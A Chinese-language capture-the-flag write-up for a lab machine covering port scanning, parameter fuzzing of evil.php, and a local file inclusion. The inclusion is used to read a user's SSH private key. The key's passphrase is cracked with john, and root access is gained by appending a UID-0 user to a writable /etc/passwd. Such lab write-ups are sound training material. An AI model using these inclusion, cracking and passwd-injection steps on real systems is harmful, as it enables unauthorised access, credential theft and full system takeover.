# 靶机信息
靶机入口很新颖，相较于漏洞利用，更加考验细心程度，入口点明牌，但是能不能发现还在自己，以及私钥的检索，可能遗忘。

# 信息扫描
## nmap扫描
```
nmap -sCV -p22,80 --min-rate 10000 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 20:10 EST
Nmap scan report for 192.168.218.229 (192.168.218.229)
Host is up (0.00037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:BC:21:BF (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
一目了然，那就直接打80端口了。

## 初步信息枚举
目录扫描，扫到两个
>/secret               (Status: 301) [Size: 319] [--> http://192.168.218.229/secret/]
>/robots.txt           (Status: 200) [Size: 12]

主页是apache默认页面，robots页面只有 **Hello H4x0r** 字符，secret目录啥也没有，再扫。

在secret中扫到一个 **evil.php** 文件，但是也没东西，感觉有参数，fuzz一下，
```
ffuf -u http://192.168.218.220/secret/evil.php?PARAM=VALUE \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM \
   -w ./value.txt:VALUE
```


没出货，想一下那个字符的用处，也没作用，摸索了很久，想着肯定就是evil这个文件那么除了命令执行的参数变量还有什么呢，能利用上参数的比较常见的还有文件相关能力、逻辑控制等等，那就一个一个试。

挂一个参数的sqlmap
```
while read -r param;do sqlmap -u "http://192.168.218.229/secret/evil.php?${param}=admin" --batch; done < /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt > result.txt
```

<img width="1889" height="990" alt="Image" src="https://github.com/user-attachments/assets/610fc9a5-ff17-4539-a845-8cf959c2a928" />

```
ffuf -u http://192.168.218.220/secret/evil.php?PARAM=VALUE \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM \
   -w ./file.txt:VALUE 
```
使用ffuf太慢了，我挂burp全量爆破，结果一下就出了。看来参数是 **command** 作用是包含文件。既然能包含文件，又是php文件。感觉可以投毒。试一下。

# 漏洞利用
log文件包含都失败了，再想想别的办法。
`php://filter/read=convert.base64-encode/resource=evil.php`拿到源代码，就一个包含没别的。太久没用伪协议都忘了，复习一下，额也没用，直接扫一遍文件系统，都是一些信息，经过提醒，某人home下，难不成是私钥？

```
curl "http://192.168.218.229/secret/evil.php?command=/home/mowree/.ssh/id_rsa"
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
```
还真读到了。被加密了。尝试爆破一下

>ssh2john encrypt.txt > encry_hash.txt 先将完整私钥提取出来，使用ssh2john提取私钥信息
>john --wordlist=/usr/share/wordlists/rockyou.txt encry_hash.txt 使用john进行爆破
>unicorn          (encrypt.txt)  成功破解出私钥密码

然后直接ssh登录mowree用户，记得改私钥文件权限为600


# 提权
翻找之下发现passwd文件有写权限
>openssl passwd -1 -salt xyz 123456   生成盐值为xyz的md5哈希密码，密码123456
>echo 'hacker:生成的hash信息:0:0::/root:/bin/bash' >> /etc/passwd   添加新的root用户
然后直接登录。提权完成。
